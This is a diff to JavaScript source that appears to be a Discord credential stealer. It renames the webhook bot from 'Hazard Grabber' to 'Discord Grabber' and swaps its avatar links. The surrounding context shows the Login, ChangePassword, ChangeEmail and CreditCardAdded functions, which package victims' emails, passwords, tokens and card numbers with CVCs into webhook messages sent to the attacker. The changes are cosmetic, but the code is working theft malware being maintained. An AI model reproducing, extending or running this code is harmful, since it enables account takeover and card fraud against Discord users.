@@ -140,9 +140,9 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Discord Grabber",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/875430642408624148/948305440184369152/e7216922aa27aa72d8166edbaf4f2f42a530961b_full.jpg",
             embeds: [
                 {
                     "color": 16507654,
@@ -182,9 +182,9 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Discord Grabber",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/875430642408624148/948305440184369152/e7216922aa27aa72d8166edbaf4f2f42a530961b_full.jpg",
             embeds: [
                 {
                     "color": 16507654,
@@ -229,9 +229,9 @@ function ChangeEmail(newemail, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Discord Grabber",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/875430642408624148/948305440184369152/e7216922aa27aa72d8166edbaf4f2f42a530961b_full.jpg",
             embeds: [
                 {
                     "color": 16507654,
@@ -276,9 +276,9 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Discord Grabber",
             content: "@everyone",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/875430642408624148/948305440184369152/e7216922aa27aa72d8166edbaf4f2f42a530961b_full.jpg",
             embeds: [
                 {
                     "color": 16507654,
